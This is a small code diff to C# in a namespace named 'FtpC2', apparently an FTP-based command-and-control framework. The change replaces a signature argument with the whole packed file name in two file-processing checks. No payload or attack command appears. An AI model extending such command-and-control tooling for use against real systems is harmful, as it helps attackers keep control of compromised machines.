@@ -54,7 +54,7 @@ namespace FtpC2
                     if (!packedFileName.Session.HasValue)
                         throw new FormatException($"Session GUID expected but not found for file \"{file}\".");
 
-                    if (!CanProcessFile(packedFileName.Signature, SelfEncryptionHelper))
+                    if (!CanProcessFile(packedFileName, SelfEncryptionHelper))
                         continue; // Ignore
 
                     string jsonData = DownloadString(file);
@@ -98,7 +98,7 @@ namespace FtpC2
                     if (!packedFileName.Session.HasValue)
                         throw new FormatException($"Session GUID expected but not found for file \"{file}\".");
 
-                    if (!CanProcessFile(packedFileName.Signature, SelfEncryptionHelper))
+                    if (!CanProcessFile(packedFileName, SelfEncryptionHelper))
                         continue; // Ignore                       
 
                     string jsonData = DownloadString(file);
